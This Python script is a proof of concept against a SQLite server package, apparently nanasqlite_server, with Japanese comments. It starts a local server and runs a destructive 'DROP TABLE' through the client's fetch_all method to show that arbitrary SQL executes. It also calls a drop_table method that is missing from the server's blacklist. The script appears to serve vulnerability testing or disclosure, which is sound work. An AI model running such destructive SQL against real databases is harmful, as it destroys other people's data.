import asyncio
import os
import sys
from nanasqlite_server.client import RemoteNanaSQLite
from nanasqlite_server.cert_gen import generate_certificate
from nanasqlite_server.key_gen import generate_keys
import subprocess
import time
import signal

async def run_poc():
    print("--- PoC: Arbitrary SQL and Forbidden Methods ---")

    # 準備
    if not os.path.exists("cert.pem"): generate_certificate()
    if not os.path.exists("nana_public.pub"): generate_keys()

    port = 5555
    env = os.environ.copy()
    env["PYTHONPATH"] = "src"
    server_proc = subprocess.Popen(
        [sys.executable, "-m", "nanasqlite_server.server", "--port", str(port)],
        env=env
    )

    time.sleep(2)

    client = RemoteNanaSQLite(host="127.0.0.1", port=port, verify_ssl=False)
    try:
        await client.connect()

        # [脆弱性 1] fetch_all による任意のSQL実行
        print("\n[Test 1] SQL Injection via fetch_all")
        await client.create_table("secret_table", {"data": "text"})
        print("Executing: DROP TABLE secret_table via fetch_all")
        await client.fetch_all("DROP TABLE secret_table")

        tables = await client.list_tables()
        if "secret_table" not in tables:
            print("RESULT: [VULNERABLE] secret_table was DROPPED!")

        # [脆弱性 2] 禁止されていない危険なメソッドの呼び出し
        print("\n[Test 2] Calling 'drop_table' (not in blacklist)")
        await client.create_table("test_table", {"id": "integer"})
        await client.drop_table("test_table")
        tables = await client.list_tables()
        if "test_table" not in tables:
            print("RESULT: [VULNERABLE] 'drop_table' executed successfully!")

    finally:
        await client.close()
        server_proc.send_signal(signal.SIGINT)
        server_proc.wait()
        if os.path.exists("server_db.sqlite"): os.remove("server_db.sqlite")

if __name__ == "__main__":
    asyncio.run(run_poc())
